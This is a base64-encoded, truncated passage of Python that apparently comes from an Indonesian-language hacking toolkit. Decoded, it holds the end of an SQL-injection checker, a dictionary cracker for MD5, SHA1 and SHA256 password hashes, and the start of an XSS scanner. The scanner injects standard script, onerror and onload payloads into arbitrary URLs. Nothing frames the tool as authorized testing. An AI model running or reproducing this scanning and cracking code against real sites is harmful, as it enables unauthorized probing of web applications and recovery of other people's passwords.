gICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgIAogICAgICAgIGlmIG5vdCB2dWxuZXJhYmxlOgogICAgICAgICAgICBwcmludChmIntGb3JlLlJFRH1bLV0gVGlkYWsgZGl0ZW11a2FuIGtlcmVudGFuYW4gU1FMIEluamVjdGlvbiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn1bK10gU2l0dXMgbXVuZ2tpbiByZW50YW4gU1FMIEluamVjdGlvbiEiKQogICAgCiAgICBkZWYgcGFzc3dvcmRfY3JhY2tlcihzZWxmLCBoYXNoX3ZhbHVlLCBoYXNoX3R5cGU9J21kNScsIHdvcmRsaXN0PU5vbmUpOgogICAgICAgICIiIlBhc3N3b3JkIGNyYWNrZXIgc2VkZXJoYW5hIiIiCiAgICAgICAgcHJpbnQoZiJcbntGb3JlLkNZQU59WypdIENyYWNraW5nIGhhc2g6IHtoYXNoX3ZhbHVlfSIpCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5DWUFOfVsqXSBIYXNoIHR5cGU6IHtoYXNoX3R5cGV9IikKICAgICAgICAKICAgICAgICAjIFdvcmRsaXN0IGRlZmF1bHQKICAgICAgICBpZiBub3Qgd29yZGxpc3Q6CiAgICAgICAgICAgIHdvcmRsaXN0ID0gWwogICAgICAgICAgICAgICAgJ3Bhc3N3b3JkJywgJzEyMzQ1NicsICdhZG1pbicsICdxd2VydHknLCAncGFzc3dvcmQxMjMnLAogICAgICAgICAgICAgICAgJ2FkbWluMTIzJywgJ2xldG1laW4nLCAnd2VsY29tZScsICdtb25rZXknLCAnMTIzNDU2Nzg5JwogICAgICAgICAgICBdCiAgICAgICAgCiAgICAgICAgZm91bmQgPSBGYWxzZQogICAgICAgIAogICAgICAgIGZvciB3b3JkIGluIHdvcmRsaXN0OgogICAgICAgICAgICAjIEhhc2gga2F0YSBzZXN1YWkgdGlwZQogICAgICAgICAgICBpZiBoYXNoX3R5cGUubG93ZXIoKSA9PSAnbWQ1JzoKICAgICAgICAgICAgICAgIGhhc2hlZCA9IGhhc2hsaWIubWQ1KHdvcmQuZW5jb2RlKCkpLmhleGRpZ2VzdCgpCiAgICAgICAgICAgIGVsaWYgaGFzaF90eXBlLmxvd2VyKCkgPT0gJ3NoYTEnOgogICAgICAgICAgICAgICAgaGFzaGVkID0gaGFzaGxpYi5zaGExKHdvcmQuZW5jb2RlKCkpLmhleGRpZ2VzdCgpCiAgICAgICAgICAgIGVsaWYgaGFzaF90eXBlLmxvd2VyKCkgPT0gJ3NoYTI1Nic6CiAgICAgICAgICAgICAgICBoYXNoZWQgPSBoYXNobGliLnNoYTI1Nih3b3JkLmVuY29kZSgpKS5oZXhkaWdlc3QoKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5SRUR9W+Kcl10gSGFzaCB0eXBlIHRpZGFrIGRpZHVrdW5nIikKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5ZRUxMT1d9WyFdIFRlc3Rpbmc6IHt3b3JkfSIsIGVuZD0nXHInKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgaGFzaGVkID09IGhhc2hfdmFsdWUubG93ZXIoKToKICAgICAgICAgICAgICAgIHByaW50KGYiXG57Rm9yZS5HUkVFTn1bK10gUEFTU1dPUkQgRElURU1VS0FOOiB7d29yZH0iKQogICAgICAgICAgICAgICAgZm91bmQgPSBUcnVlCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgIAogICAgICAgIGlmIG5vdCBmb3VuZDoKICAgICAgICAgICAgcHJpbnQoZiJcbntGb3JlLlJFRH1bLV0gUGFzc3dvcmQgdGlkYWsgZGl0ZW11a2FuIGRhbGFtIHdvcmRsaXN0IikKICAgIAogICAgZGVmIHhzc19zY2FubmVyKHNlbGYsIHVybCk6CiAgICAgICAgIiIiU2Nhbm5lciBYU1Mgc2VkZXJoYW5hIiIiCiAgICAgICAgcHJpbnQoZiJcbntGb3JlLkNZQU59WypdIFNjYW5uaW5nIFhTUzoge3VybH0iKQogICAgICAgIAogICAgICAgICMgUGF5bG9hZCBYU1MKICAgICAgICBwYXlsb2FkcyA9IFsKICAgICAgICAgICAgJzxzY3JpcHQ+YWxlcnQoIlhTUyIpPC9zY3JpcHQ+JywKICAgICAgICAgICAgJzxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgiWFNTIik+JywKICAgICAgICAgICAgJzxzdmcvb25sb2FkPWFsZXJ0KCJYU1MiKT4nLAogICAgICAgICAgICAnXCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PicsCiAgICAgICAgICAgICdqYXZhc2NyaXB0OmFsZXJ0KCJYU1MiKScKICAgICAgICBdCiAgICAgICAgCiAgICAgICAgdnVsbmVyYWJsZSA9IEZhbHNlCiAgICAgICAgCiAgICAgICAgZm9yIHBheWxvYWQgaW4gcGF5bG9hZHM6CiAgICAgICAgICAgIHRlc3RfdXJsID0gZiJ7dXJsfXt1cmxsaWIucGFyc2UucXVvdGUocGF5bG9hZCl9IgogICAgICAgICAgICBwcmludChmIntGb3JlLllFTExPV31bIV0gVGVzdGluZyBwYXlsb2FkLi4uIikKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHRlc3RfdXJsLCB0aW1lb3V0PTUpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIHBheWxvYWQucmVwbGFjZSgnPCcsICcmbHQ7Jykgbm90IGluIHJlc3BvbnNlLnRleHQ6CiAgICAgICAgICAgICAgICAgICAgaWYgcGF5bG9hZCB
